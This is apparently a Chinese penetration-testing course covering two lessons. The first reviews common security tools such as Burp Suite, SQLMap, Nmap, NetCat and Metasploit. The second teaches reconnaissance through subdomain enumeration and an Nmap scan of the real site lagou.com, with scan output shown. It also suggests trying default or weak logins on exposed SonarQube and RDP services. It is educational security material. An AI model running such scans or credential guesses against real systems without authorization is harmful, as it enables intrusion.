
<p>
对个人而言，专业版就足够了。其实我觉得 <b>Burp Suite的漏洞扫描功能一般，
漏洞发现能力并没有那么强</b> ，其检测结果仅作为参考。对于漏洞扫描，我更喜
欢使用稍后要介绍的几款漏洞扫描工具。
</p>

<p>
以前我做渗透测试时比较习惯用 FireFox，因为它有丰富的安全测试插件。现在
Chrome 市场占有率已经超过 70%，以前 FireFox 中很多优秀的插件也移植到了
Chrome 中，因此我现在基本只用 Chrome。
</p>

<p>
这里提到浏览器，是因为在使用 Burp Suite 前需要配置浏览器代理，这样才能
将HTTP/HTTPS 请求转发到 Burp Suite 上进行分析与测试。
</p>

<p>
在 Chrome的设置中搜索“代理”会让你选择“打开您计算机的代理设置”，如
下图所示：
</p>


<figure id="org97cf28e">
<img src="./images/Cip5yF_ZsVeACMEcAAIScM5BkEE861.png" alt="Cip5yF_ZsVeACMEcAAIScM5BkEE861.png" width="80%">

</figure>

<p>
图 3 Chrome 代理设置
</p>

<p>
打开之后你就可以设置 HTTP/HTTPS 代理为 Burp Suite 的对应端口，默认为
127.0.0.1:8080。下面两张图分别是系统和 Burp Suite 上的代理设置页面：
</p>


<figure id="org13c5b26">
<img src="./images/Cip5yF_ZsWiAZ9iGAACtiDp2x7A093.png" alt="Cip5yF_ZsWiAZ9iGAACtiDp2x7A093.png" width="80%">

</figure>

<p>
图 4 系统代理设置页面
</p>


<figure id="org6bf92f0">
<img src="./images/Ciqc1F_ZsXSAHU-wAAA9V42FWPM054.png" alt="Ciqc1F_ZsXSAHU-wAAA9V42FWPM054.png" width="80%">

</figure>

<p>
图 5 Burp Suite 代理设置页面
</p>

<p>
如果每次使用都要进行这样的配置代理其实还挺麻烦的，毕竟有时也得正常地使
用浏览器上网。我在这里推荐个小技巧：你可以使用Chrome 上的插件“ <b>Proxy
SwitchyOmega</b> ”来快速切换代理，如果你用的是FireFox，那可以使用
FoxyProxy 插件。
</p>

<p>
在 Chrome 应用商店中搜索“Proxy SwitchyOmega”并安装它，然后像下图这样
配置：
</p>


<figure id="orgc2ee4a7">
<img src="./images/CgqCHl_ZsX2ANrS4AAEIEgIoD68852.png" alt="CgqCHl_ZsX2ANrS4AAEIEgIoD68852.png" width="80%">

</figure>

<p>
图 6 Proxy SwitchyOmega 配置
</p>

<p>
配置完成后你就可以在 Chrome 浏览器右上角的插件栏中点击“Proxy
SwitchyOmega”插件图标，选择上面创建的“Burp Suite”情景模式开启代理，
若想关闭代理直接选择“系统代理”即可。
</p>


<figure id="org6a79511">
<img src="./images/Cip5yF_ZsZWAONnTAALKGIyBcc4584.png" alt="Cip5yF_ZsZWAONnTAALKGIyBcc4584.png" width="80%">

</figure>

<p>
图 7 Proxy SwitchyOmega 快速代理展示
</p>

<p>
下图是代理成功后，Burp Suite 拦截到流量的效果图：
</p>


<figure id="orgc56d919">
<img src="./images/Cip5yF_ZsaKAVGGeAAJbFdx82DU937.png" alt="Cip5yF_ZsaKAVGGeAAJbFdx82DU937.png" width="80%">

</figure>

<p>
图 8 Burp Suite 代理成功
</p>

<p>
其他更详细的 Burp Suite功能，你可以参考<a href="https://portswigger.net/burp/documentation/contents">Burp Suite Document</a>和<a href="https://t0data.gitbooks.io/burpsuite/content/">Burp Suite 实战指南</a>这两份资料学习，此处不再展开。
</p>
</div>
</div>
<div id="outline-container-acunetix-wvs" class="outline-3">
<h3 id="acunetix-wvs">Acunetix WVS</h3>
<div class="outline-text-3" id="text-acunetix-wvs">
<p>
Acunetix WVS（Web Vulnerability Scanner）是我以前经常用的 Web漏洞扫描
器，也曾用它刷了不少国内 SRC 平台的漏洞。
</p>


<figure id="org9b278fa">
<img src="./images/CgqCHl_ZscGAeTzSAAIginYu50Q791.png" alt="CgqCHl_ZscGAeTzSAAIginYu50Q791.png" width="80%">

</figure>

<p>
图 9 Acunetix WVS
</p>

<p>
<b>WVS 支持登录态扫描，可以登录账号访问需要权限的页面，从而爬取更多URL，
提高漏洞发现率</b> 。这个功能很重要，有些网页的功能全都要求登录，如果没有
这一步设置，你什么也扫不到。不过现在很多扫描器也支持登录态扫描了。
</p>

<p>
这几年 WVS 也在不断地更新维护，它属于收费软件，一年 3,331.99美元（相当
于 22049 元），对企业来说可以接受。但 WVS的规则越做越烂，现在的版本扫
出来的漏洞大部分都是误报，参考价值不如以前。
</p>

<p>
关于 WVS 的具体使用，你可以参考 Acunetix WVS官方提供的<a href="https://www.acunetix.com/resources/wvsmanual.pdf">使用文档</a>。
</p>
</div>
</div>
<div id="outline-container-xrayweb-漏洞扫描器" class="outline-3">
<h3 id="xrayweb-漏洞扫描器">Xray：Web 漏洞扫描器</h3>
<div class="outline-text-3" id="text-xrayweb-漏洞扫描器">
<p>
随着 WVS 的没落，国内的长亭科技出了一款叫作 Xray的漏洞扫描器，现在国内
不少白帽子开始使用它。他们会自己开发一些自动化工具去爬虫，然后导入地址
到WVS 和 Xray扫描（参考资料：<a href="https://github.com/ox01024/Xray_and_crwlergo_in_server">Xray_and_crwlergo_in_serve</a>、
<a href="https://github.com/timwhitez/crawlergo_x_XRAY">crawlergo_x_XRAY</a>），在扫到漏洞后，微信会自动通知。
</p>


<figure id="org0f896a7">
<img src="./images/Cip5yF_Zsc6AaAIpAADD4PGQU64235.png" alt="Cip5yF_Zsc6AaAIpAADD4PGQU64235.png" width="80%">

</figure>

<p>
图 10 Xray
</p>

<p>
我在使用 Xray 的时候发现， <b>Xray 的准确率要比 WVS高，但漏洞发现率不是
很高</b> ，经常扫完后报告是空的，而且 Xray的扫描速度很慢，还有一定优化的
空间。
</p>
</div>
</div>
<div id="outline-container-goby基于网络空间测绘的漏洞扫描器" class="outline-3">
<h3 id="goby基于网络空间测绘的漏洞扫描器">Goby：基于网络空间测绘的漏洞扫描器</h3>
<div class="outline-text-3" id="text-goby基于网络空间测绘的漏洞扫描器">
<p>
Goby是一款国内新出的安全扫描器，它基于网络空间测绘技术进行资产收集，也
就是先通过对目标网络的IT资产进行规则分析，建立知识库，在发生安全事件时
就能直接用于应急响应，这项功能比较适合企业内部。Goby属于免费的工具，且
跨平台支持 Windows、Linux 和macOS，界面不错，还提供了多个皮肤。
</p>


<figure id="orgadd4911">
<img src="./images/Cip5yF_ZsduADxmJAAQFbh7gdPE888.png" alt="Cip5yF_ZsduADxmJAAQFbh7gdPE888.png" width="80%">

</figure>

<p>
图 11 Goby
</p>

<p>
<b>Goby有个比较实用的功能，那就是支持自定义规则的漏洞扫描框架</b> 。它本身
也会收集一些产品的PoC（概念证明，常被用于验证是否存在漏洞，如下图所示），
同时在外部曝光或自主挖掘到漏洞时，借助该框架添加规则，可以快速去扫描相
关资产是否存在漏洞， <b>对于企业应急和个人刷SRC 平台漏洞是一个神器</b> 。
</p>


<figure id="org5f68b2e">
<img src="./images/Cip5yF_ZseWAdqgJAAGCxqkdD48418.png" alt="Cip5yF_ZseWAdqgJAAGCxqkdD48418.png">

</figure>

<p>
图 12 Goby 收集的 PoC
</p>

<p>
Goby
的使用可以参考<a href="https://cn.gobies.org/docs.html?v=1">官方文档</a>中的内容。
</p>
</div>
</div>
<div id="outline-container-sqlmapsql-注入检测与利用" class="outline-3">
<h3 id="sqlmapsql-注入检测与利用">SQLMap：SQL 注入检测与利用</h3>
<div class="outline-text-3" id="text-sqlmapsql-注入检测与利用">
<p>
<b>SQLMap 无疑是 SQL 注入工具中的王者</b> 。在 SQL注入漏洞检测与利用上，
SQLMap提供了非常全面的功能，哪怕是一些漏洞无法检测到，许多白帽子仍习惯
在上面做二次开发，或者利用tamper 脚本来扩展。
</p>


<figure id="org0b27f24">
<img src="./images/CgqCHl_ZsfSAc3xqAAlj1Wt1MjA788.png" alt="CgqCHl_ZsfSAc3xqAAlj1Wt1MjA788.png" width="80%">

</figure>

<p>
图 13 SQLMap
</p>

<p>
我将在“第 06 讲”和“第 07讲”中详细介绍该工具的使用，此处不再赘述，
详细的使用方法可以从<a href="http://sqlmap.org/">官网</a>了解。
</p>
</div>
</div>
<div id="outline-container-nmap网络扫描与主机检测" class="outline-3">
<h3 id="nmap网络扫描与主机检测">Nmap：网络扫描与主机检测</h3>
<div class="outline-text-3" id="text-nmap网络扫描与主机检测">
<p>
Nmap有界面版本和命令行版本，我比较喜欢使用命令行，因为可操作空间大一些。
</p>


<figure id="orgb9c5f9a">
<img src="./images/CgqCHl_ZsgKARmaVAAIlxL9iyXY234.png" alt="CgqCHl_ZsgKARmaVAAIlxL9iyXY234.png" width="80%">

</figure>

<p>
图 14 Nmap 界面版本
</p>


<figure id="orgb9eba43">
<img src="./images/CgqCHl_ZshKAJg3QAAgAnpqJC2Y626.png" alt="CgqCHl_ZshKAJg3QAAgAnpqJC2Y626.png" width="80%">

</figure>

<p>
图 15 Nmap 命令行版本
</p>

<p>
很多人只知道 Nmap可用于端口扫描和主机服务识别，但实际上它远不止如此。
Nmap提供的丰富脚本，大大扩展了它的功能，它可以探测弱口令，甚至是漏洞扫
描。Nmap的功能十分强大，需要你慢慢探索。
</p>

<p>
关于 Nmap详细的使用说明，你可以参考<a href="https://nmap.org/book/toc.html">官方文档</a>，在下一讲“信息收集：掌握
目标的一切信息”中，我还会提到Nmap。
</p>
</div>
</div>
<div id="outline-container-postman模拟发包工具" class="outline-3">
<h3 id="postman模拟发包工具">Postman：模拟发包工具</h3>
<div class="outline-text-3" id="text-postman模拟发包工具">
<p>
虽然 Burp Suite功能强大，但有时会觉得开启代理麻烦，对于能在浏览器上直
接完成的，我一般都不开Burp Suite 操作。
</p>

<p>
Chrome上自带的开发者工具可以直接抓包查看：通过在网页右击，选择“检查”
即可打开；然后切换到“Network”标签页，操作网页后即可获取到网络请求包，
但它不支持拦截修改请求包。
</p>


<figure id="org7a4c148">
<img src="./images/Ciqc1F_ZshyALB-qAAGumg9CRg0315.png" alt="Ciqc1F_ZshyALB-qAAGumg9CRg0315.png" width="80%">

</figure>

<p>
图 16 Chrome 抓包
</p>

<p>
<b>如果你想直接构造请求去发包，或者用来测试一些网络接口的调用，那使用
Postman 再适合不过了</b> 。安装完 Postman 后，通过 Chrome标签栏的“应用”
即可打开 Postman。
</p>


<figure id="orgf3689ba">
<img src="./images/Ciqc1F_ZsiaAL7vJAADOYBSf2OE763.png" alt="Ciqc1F_ZsiaAL7vJAADOYBSf2OE763.png" width="80%">

</figure>

<p>
图 17 Chrome “应用”标签
</p>


<figure id="org3c42291">
<img src="./images/Ciqc1F_ZsjGAYczeAAXvGuO1mGE366.png" alt="Ciqc1F_ZsjGAYczeAAXvGuO1mGE366.png" width="80%">

</figure>

<p>
图 18 Postman
</p>

<p>
Postman 也支持网络拦截来修改数据包重发，但需要另外安装个插件“Postman
Interceptor”，我感觉没有 Burp Suite 来得好用和强大，因此我很少用它。
关于Postman更多的使用方法，可以参考<a href="https://learning.postman.com/docs/getting-started/introduction/">官方文档</a>。
</p>

<p>
对于 Postman 与 Burp Suite， <b>轻量操作可以选择Postman</b> ，比如单纯发包
测试接口，又懒得配置代理的操作； <b>如果你需要更多安全测试方面的功能</b> ，
比如改包、批量发包测试用来暴力猜解密码或遍历信息， <b>那么Burp Suite 无
疑是最佳的选择</b> 。
</p>
</div>
</div>
<div id="outline-container-hackbar安全测试插件" class="outline-3">
<h3 id="hackbar安全测试插件">HackBar：安全测试插件</h3>
<div class="outline-text-3" id="text-hackbar安全测试插件">
<p>
HackBar 是一款非常经典的 Web 安全测试插件，最早出现在 FireFox浏览器中，
后来也被移植到了 Chrome。它可以用来构造 GET/POST请求，自带一些编码解码
工具，以及 XSS 和 SQL注入常用测试用例，能为你在实际测试中提供很大的便
利。
</p>


<figure id="orgeccbc6b">
<img src="./images/Cip5yF_ZskSAMLsBAAFVySz_ctA678.png" alt="Cip5yF_ZskSAMLsBAAFVySz_ctA678.png" width="80%">

</figure>

<p>
图 19 HackBar
</p>

<p>
HackBar 的功能跟 Postman 有些类似，都是用来模拟发包的工具， <b>但HackBar显然是为专业的安全人员开发的，而 Postman虽然有很多开发在用，但
常被用来测试一些网络 API 接口</b> 。
</p>

<p>
HackBar使用非常简单，正如它简洁的界面一样，所有的功能都可以很快上手，
用几次基本就熟练了。无论是HackBar 还是Postman，你都可以试一下，选择自
己顺手的工具即可。不管什么工具，能够帮助你挖到漏洞的都是好工具。
</p>
</div>
</div>
<div id="outline-container-ncnetcat网络瑞士军刀" class="outline-3">
<h3 id="ncnetcat网络瑞士军刀">NC（NetCat）：网络瑞士军刀</h3>
<div class="outline-text-3" id="text-ncnetcat网络瑞士军刀">
<p>
我习惯称 NC 为瑞士军刀，因为它简单易用，功能强大，在行业内非常流行。在
实际渗透测试中，我最常用的有两个功能：
</p>

<ul class="org-ul">
<li><b>监听端口以等待后门回连</b> ；</li>

<li><b>发包测试</b> ，有时请求包内容较多，可以放在一个文件里面直接提交（不局
限http/https 这种请求），其他任意端口都支持，所以它要比 postman 和
hackbar 这些发包工具的应用范围要广。</li>
</ul>

<p>
除此之外 NC还有其他功能，比如端口扫描、作为代理来端口转发数据，甚至可
以在两台主机之间搭建起聊天室。
</p>


<figure id="org916ef7b">
<img src="./images/CgpVE1_ZsmOAJ1y7AADZnpy2HvE117.png" alt="CgpVE1_ZsmOAJ1y7AADZnpy2HvE117.png" width="80%">

</figure>

<p>
图 20 NC
</p>

<p>
更多 NC 命令参数的使用，可以通过 man nc 命令来查看。
</p>
</div>
</div>
<div id="outline-container-metasploit渗透测试平台" class="outline-3">
<h3 id="metasploit渗透测试平台">Metasploit：渗透测试平台</h3>
<div class="outline-text-3" id="text-metasploit渗透测试平台">
<p>
Metasploit在渗透测试中经常被使用到，它不是一个单纯的工具，而是一个集成
各种渗透测试工具的平台，上面有很多漏洞利用工具，还有免杀处理、后门生成
与留存、远程控制等很多强大的功能。
</p>


<figure id="orge84d2ea">
<img src="./images/CgpVE1_ZsnGAdzeMAADU1Q17564791.png" alt="CgpVE1_ZsnGAdzeMAADU1Q17564791.png" width="80%">

</figure>

<p>
图 21 Metasploit
</p>

<p>
以前我经常用 Metasploit来辅助编写名为“内存破坏漏洞”的利用程序。
<b>Metasploit在主机渗透，甚至是当前移动手机上的渗透测试都可以使用</b> ，所
以这里我非常推荐你去好好研究一下Metasploit 平台的应用。
</p>

<p>
国内外已经出版了很多本关于 Metasploit的书籍，你也可以直接阅读<a href="https://docs.rapid7.com/metasploit/">官方文档</a>。
</p>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲我向你介绍了一些常用的渗透测试工具，它们也是我平常用得比较多的几
款工具，你可以多用用，挑选自己感觉比较顺手的工具。
</p>

<p>
这里没有详细介绍每一款工具的安装和使用，因为这些工具在网上都有很多资料，
我只对它们做一个简单的介绍，让你能了解它们。
</p>

<p>
我非常推荐去阅读 <b>官方的第一手资料，它们经常保持更新，且资料说明也比较
全面，比二手资料要好很多</b> 。本讲除了介绍一些常用工具外，更重要的是想向
你传递两个信息：
</p>

<ol class="org-ol">
<li><code>尽量阅读一手资料</code> ；</li>

<li><code>多用搜索引擎查找相关资料学习</code> 。</li>
</ol>

<p>
除了本讲介绍的工具外，你还知道哪些好用的渗透测试工具呢？欢迎在留言区分享推荐。
</p>

<p>
下一讲，我将带你了解一些收集渗透目标相关信息的方法和工具，它是我们开展
渗透测试工作的第一步。
</p>


<figure id="orgadd925a">
<img src="./images/CgqCHl_bAECAVuIWAAUjsOlJH20170.png" alt="CgqCHl_bAECAVuIWAAUjsOlJH20170.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:beccc5d8-6cff-4a4d-a347-667163b8289e" class="outline-2">
<h2 id="h:beccc5d8-6cff-4a4d-a347-667163b8289e">信息收集：掌握目标的一切信息</h2>
<div class="outline-text-2" id="text-h:beccc5d8-6cff-4a4d-a347-667163b8289e">
<p>
你好，我是赢少良。上一讲我介绍了一些常用的渗透测试工具，有些在这一讲中
就会用到。这一讲主要是想和你分享渗透目标的信息收集技术，它 <b>在开始一项
渗透测试工作的前期工作中有着很重要的地位</b> ，因为这 <b>决定了你能找到的攻
击面有多大，也是你能否成功渗透目标的关键</b> 。
</p>
</div>
<div id="outline-container-信息收集方法" class="outline-3">
<h3 id="信息收集方法">信息收集方法</h3>
<div class="outline-text-3" id="text-信息收集方法">
<p>
根据收集方式的不同，我们可以将信息收集分为两类：主动收集和被动收集。下
面我先介绍一下这两个概念。
</p>

<ul class="org-ul">
<li>主动收集是指 <b>通过扫描确认目标的操作系统和网络服务</b> ，为后续发现漏洞
提供信息帮助，但它可能引起目标的注意，或被记录下扫描行为。一些服务指
纹检测、网站爬虫都是主动收集的方式，它们直接向目标发起请求，在有防火
墙的情况下，可能会被拦截告警。</li>

<li>被动收集是指 <b>在不接触目标的情况下，通过互联网搜索来收集目标遗留在网
络中的信息</b> 。这样可以避免引起目标的警觉。网上很多人说的 <b>公开来源情
报</b> （Open-Source Intelligence，OSINT，简称“开源情报”）正是需要被
动收集的信息，它是从公共资源中收集到的。</li>
</ul>

<p>
综上可以看出，主动收集与被动收集的主要区别就在于 <b>收集信息的过程中是否
需要接触目标</b> 。在实际渗透测试过程中，一般两种方法都会用上，以收集更多
有价值的信息。
</p>

<p>
在收集信息时，无论是主动还是被动，都建议使用小号，尤其是在一些社交平台
上的信息收集，小号可以避免行为暴露。
</p>
</div>
</div>
<div id="outline-container-信息收集实践" class="outline-3">
<h3 id="信息收集实践">信息收集实践</h3>
<div class="outline-text-3" id="text-信息收集实践">
<p>
关于信息收集的工具，你平常可以多关注一些开源工具。GitHub上有很多，遇到
好的工具可以下载收藏，避免临时找工具或者被迫手工操作，那会非常影响效率。
</p>

<p>
在操作系统 <a href="https://www.kali.org/">Kali</a> 和<a href="https://www.parrotsec.org">Parrot</a>中有相应的工具列表，你可以找到很多不错的工具。
</p>

<p>
下面我将介绍 6 个信息收集的方法，分别是
</p>
<ul class="org-ul">
<li>子域名与 IP收集</li>
<li>端口服务探测</li>
<li>网站指纹识别</li>
<li>旁站与 C 段查询</li>
<li>WAF探测和敏感信息收集</li>
</ul>
</div>
<div id="outline-container-子域名与-ip-收集" class="outline-4">
<h4 id="子域名与-ip-收集">子域名与 IP 收集</h4>
<div class="outline-text-4" id="text-子域名与-ip-收集">
<p>
收集子域名和 IP常常是信息收集的开端，这对你摸清整个目标的资产起着很关
键的作用，它们直接决定了渗透目标范围的大小。当然，有时候渗透测试任务直
接限死子域名，这种情况下这一步就可以直接省略了。
</p>

<p>
在 GitHub 上有一个开源项目，叫<a href="https://github.com/arkadiyt/bounty-targets-data">bounty-targets-data</a>，它会收集一些漏洞奖
励计划中的域名范围，并在持续更新，目前已经收集了2000 多个域名。对于喜
欢刷漏洞奖励平台的同学，bounty-targets-data确实是一份不错资源，它可以
开启循环扫描，不停地去扫这些有奖励计划的域名，运气好的话，可以挖到漏洞
拿奖金。
</p>

<p>
关于收集子域名的技术原理在《<a href="https://security.tencent.com/index.php/blog/msg/161">红蓝对抗之域名搜集方法总结</a>》中有详细的介绍，
主要包括证书透明度、DNS查询、Whois 查询、备案网站、搜索引擎、暴力猜测
等多种方法实现。
</p>

<p>
收集子域名可以通过一些在线网站或者本地工具来收集，常用的工具或站点有
OneForAll、subDomainsBrute、subfinder、ESD、Amass、DNSDumpster 和
Subdomain Finder。
</p>

<ul class="org-ul">
<li><p>
<a href="https://github.com/shmilylty/OneForAll">OneForAll</a>在功能上非常集全，使用字典爆破、证书透明度、常规检查（域传
递、sitemap文件、robts 文件、内容安全策略 csp 等）、网络爬虫、DNS 数
据集、DNS查询、威胁情报平台、搜索引擎等多种方式，也支持多种文件格式
导出。OneForAll收集到的有效域名很多，但经常会有误报，速度也相对比较
慢。
</p>

<p>
使用示例如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">python3 oneforall.py --target lagou.com run
</pre>
</div>


<figure id="orgea76b3f">
<img src="./images/CgpVE1_Zs8GACtELAAPLVt3Jvzo273.png" alt="CgpVE1_Zs8GACtELAAPLVt3Jvzo273.png" width="80%">

</figure>

<p>
图 1：OneForAll
</p></li>

<li><p>
<a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a>采用暴力猜解域名的方式，速度快、准确度高。但由于是字
典猜解方式，仍会存在一定的漏报。
</p>


<figure id="orge003814">
<img src="./images/Cip5yF_Zs8mAA8mZAABmufeGtgo263.png" alt="Cip5yF_Zs8mAA8mZAABmufeGtgo263.png" width="80%">

</figure>

<p>
图 2：subDomainsBrute 运行效果图
</p>


<figure id="org4566537">
<img src="./images/CgqCHl_Zs9CAAyGNAAGHTTFk6E8801.png" alt="CgqCHl_Zs9CAAyGNAAGHTTFk6E8801.png" width="80%">

</figure>

<p>
图 3：subDomainsBrute 爬取的域名结果图
</p>

<p>
同一域名有时会有指向多个 IP 地址情况，因为企业可能采用 CDN内容分发网
络，就近选择网络最好的节点服务器响应用户。因此，有时同一台机器访问同
一个域名时，会访问到不同的IP，比如 weixin.lagou.com 就是如此。
</p>


<figure id="orga42b20e">
<img src="./images/Ciqc1F_Zs9iAPsGyAAEeKOg3y5k105.png" alt="Ciqc1F_Zs9iAPsGyAAEeKOg3y5k105.png" width="80%">

</figure>

<p>
图 4：同一个域名的不同 IP
</p>

<p>
subDomainsBrute 也会将同一域名指向的多个 IP 一并收集起来，但如果超过
10个 IP 就会放弃收集。
</p>

<p>
使用示例如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">python3 subDomainsBrute.py lagou.com
</pre>
</div></li>

<li><p>
<a href="https://github.com/projectdiscovery/subfinder">subfinder</a>的扫描速度很快，它支持很多第三方 API接口（需要配置），同时
支持多种输出格式，但subfinder 没有字典爆破域名的功能。
</p>

<p>
使用示例如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">subfinder -d lagou.com
</pre>
</div>


<figure id="org4232e92">
<img src="./images/Ciqc1F_Zs-yAEoFuAADD99-z4Ik735.png" alt="Ciqc1F_Zs-yAEoFuAADD99-z4Ik735.png" width="80%">

</figure>

<p>
图 5：subfinder
</p></li>

<li><p>
<a href="https://github.com/FeeiCN/ESD">ESD</a>支持域名爆破、DNS解析、域传递、搜索引擎、证书透明度等多种搜索方式，
还支持zoomeye、censys、fofa、shodan等网络空间搜索引擎的接口结果收集，
这个需要在配置文件中设置 key或者账密才能使用。
</p>

<p>
ESD 有时的搜索结果不太稳定，对同一域名的多次搜索可能会不一样，比如跑
lagou.com，一次跑出 27 个域名，一次跑出 67 个域名，差异很大。
</p>

<p>
使用示例如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">esd -d lagou.com
</pre>
</div>


<figure id="org3ff87f1">
<img src="./images/Ciqc1F_Zs_iABcOrAALV9jkN3Zo313.png" alt="Ciqc1F_Zs_iABcOrAALV9jkN3Zo313.png" width="80%">

</figure>

<p>
图 6：ESD
</p></li>

<li><p>
<a href="https://github.com/OWASP/Amass">Amass</a>是一款 OWASP出口的资产搜索工具，除了常规的域名收集方式，它还支
持搜索结果可视化，并能从很多网站和API 收集子域名。另外，它提供了一套
类似 Nmap的脚本引擎，支持用户自定义数据源以扩展搜索范围。它的扫描速
度非常慢，但能够收集到非常多的子域名信息。
</p>

<p>
以 lagou.com 为例，它共收集到了 40769个子域。这数据相当多了，不过里
面有不少是跳转到主页 lagou.com的，实际没有单独的子域网站，即不同域名
指向同一台服务器，或者是直接 302跳转到主页的情况。这些子域在网站扫描
时可以考虑去重，避免重复扫描。
</p>

<p>
使用示例如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">amass enum -o out.txt -d lagou.com
</pre>
</div>


<figure id="orgaf1b326">
<img src="./images/CgqCHl_ZtAWATELmAAGlhU6Ab50316.png" alt="CgqCHl_ZtAWATELmAAGlhU6Ab50316.png" width="80%">

</figure>

<p>
图 7：Amass
</p></li>

<li><p>
<a href="https://dnsdumpster.com/">DNSDumpster</a>可以在线搜索子域名以及相应的IP 地址，提供 xlsx 文件导出，
以及整个域名映射关系图、IP分布地图等信息，在展示和准确度上还是不错的。
它的搜索速度也很快，但就是子域收集相对少很多。
</p>


<figure id="orga7b0ee5">
<img src="./images/CgqCHl_ZtA2AdSg9AAJyoGGL9kE009.png" alt="CgqCHl_ZtA2AdSg9AAJyoGGL9kE009.png" width="80%">

</figure>

<p>
图 8：DNSDumpster
</p></li>

<li><p>
<a href="https://subdomainfinder.c99.nl/">Subdomain Finder</a>支持在线搜索子域名以及相应的 IP地址。它的扫描速度很
快，若没有显示 IP则代表域名没有绑定有效的网络服务器，或者无法访问该
域名。在界面上，它直接提供“Check Status”功能来检测网站的访问状态。
该网站上还提供有“Private scan”功能，可以防止扫描时被记录。但它的不
足之处在于，扫描结果无法直接导出文件到本地。
</p>


<figure id="org3339df9">
<img src="./images/Cip5yF_ZtBWAJtG0AAIX71NtOjI255.png" alt="Cip5yF_ZtBWAJtG0AAIX71NtOjI255.png" width="80%">

</figure>

<p>
图 9：Subdomain Finder
</p></li>
</ul>

<p>
以<a href="https://www.lagou.com/">拉勾网</a>（lagou.com）为例，我对上述工具的子域检测结果进行了统计对比，
得到的结果如下表所示：
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-right">

<col  class="org-right">

<col  class="org-right">
</colgroup>
<tbody>
<tr>
<td class="org-left">工具</td>
<td class="org-right">域名总数</td>
<td class="org-right">可访问域名</td>
<td class="org-right">扫描时长(秒)</td>
</tr>

<tr>
<td class="org-left">Subdomain Finder</td>
<td class="org-right">69</td>
<td class="org-right">66</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">DNSDumpster</td>
<td class="org-right">10</td>
<td class="org-right">10</td>
<td class="org-right">10</td>
</tr>

<tr>
<td class="org-left">OneForAll</td>
<td class="org-right">127</td>
<td class="org-right">101</td>
<td class="org-right">142</td>
</tr>

<tr>
<td class="org-left">subDomainsBrute</td>
<td class="org-right">44</td>
<td class="org-right">38</td>
<td class="org-right">114`</td>
</tr>

<tr>
<td class="org-left">subfinder</td>
<td class="org-right">57</td>
<td class="org-right">49</td>
<td class="org-right">30</td>
</tr>

<tr>
<td class="org-left">ESD</td>
<td class="org-right">67</td>
<td class="org-right">58</td>
<td class="org-right">195</td>
</tr>

<tr>
<td class="org-left">amass</td>
<td class="org-right">40778</td>
<td class="org-right">38294</td>
<td class="org-right">1260</td>
</tr>
</tbody>
</table>


<figure id="org20faf37">
<img src="./images/Ciqc1F_a0IGAHK2bAABkEd5bIdI794.png" alt="Ciqc1F_a0IGAHK2bAABkEd5bIdI794.png">

</figure>

<p>
图 10：不同工具的子域检测结果统计对比
</p>

<p>
可以看到，Amass 扫出的数据实在是太多了（大部分是直接跳转到 lagou.com主
页），其他工具的柱状数据会小得无法比较。因此，在画统计图的时候我去掉了
它。
</p>


<figure id="org6ce9c62">
<img src="./images/Cip5yF_ZtD-AKbNrAABBweJgAwg550.png" alt="Cip5yF_ZtD-AKbNrAABBweJgAwg550.png" width="80%">

</figure>

<p>
图 11：子域检测结果统计图
</p>

<p>
我用得比较多的是 OneForAll 和 Subdomain Finder，在收集域名时则更喜欢用
Subdomain Finder + OneForAll + subfinder + Amass 的组合。像 Amass输出
太多了，它扫描和验证有效性的时间也比较长。
</p>
</div>
</div>
<div id="outline-container-端口服务探测" class="outline-4">
<h4 id="端口服务探测">端口服务探测</h4>
<div class="outline-text-4" id="text-端口服务探测">
<p>
在上一讲“ <b>01 | 武器库：常用的渗透测试工具</b> ”中我介绍了Nmap，用它来
扫描端口服务就足够了。那我们为什么要做端口服务探测呢？
</p>

<p>
近期 FBI 发布紧急警告称，SonarQube商业化源码审计系统被利用默认弱密码窃
取政府内部一些产品源代码。
</p>

<p>
安装 SonarQube 时会默认开启 9000 端口，默认的管理员账号密码均为admin。
攻击者在网站上扫描开放 9000 端口的服务器，若发现是 SonarQube就可以尝试
用 admin登录，如果能登录就可以窃取到上面的产品源码了。这是扫描端口服务
非常典型的应用场景。
</p>

<p>
再比如端口 3389用于远程桌面连接，如果发现了，也可以尝试用弱密码登录，
或者利用一些远程桌面漏洞去测试。
</p>

<p>
针对开放端口和服务识别的方式，在渗透测试过程可以有针对性地采取不同的测
试方法，虽然简单，但非常有效。
</p>

<p>
下面以探测拉勾网的端口服务为例，使用 Nmap 去探测：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">$ Nmap -A lagou.com
Starting Nmap 7.91 ( https://Nmap.org ) at 2020-11-15 12:55 CST
Nmap scan report for lagou.com (117.50.36.103)
Host is up (0.037s latency).
Other addresses for lagou.com (not scanned): 117.50.39.99 106.75.118.232
Not shown: 993 closed ports
PORT     STATE    SERVICE        VERSION
80/tcp   open     http           OpenResty web app server
|_http-server-header: openresty
|_http-title: Did not follow redirect to https://www.lagou.com/
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
443/tcp  open     ssl/http       OpenResty web app server
|_http-server-header: openresty
|_http-title: Did not follow redirect to https://www.lagou.com/
| ssl-cert: Subject: commonName=*.lagou.com/organizationName=\xE5\x8C\x97\xE4\xBA\xAC\xE6\x8B\x89\xE5\x8B\xBE\xE7\xBD\x91\xE7\xBB\x9C\xE6\x8A\x80\xE6\x9C\xAF\xE6\x9C\x89\xE9\x99\x90\xE5\x85\xAC\xE5\x8F\xB8/stateOrProvinceName=\xE5\x8C\x97\xE4\xBA\xAC/countryName=CN
| Subject Alternative Name: DNS:*.lagou.com, DNS:lagou.com
| Not valid before: 2019-04-01T08:51:44
|_Not valid after:  2021-05-19T12:00:00
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
445/tcp  filtered microsoft-ds
593/tcp  filtered http-rpc-epmap
4444/tcp filtered krb524

Service detection performed. Please report any incorrect results at https://Nmap.org/submit/ .
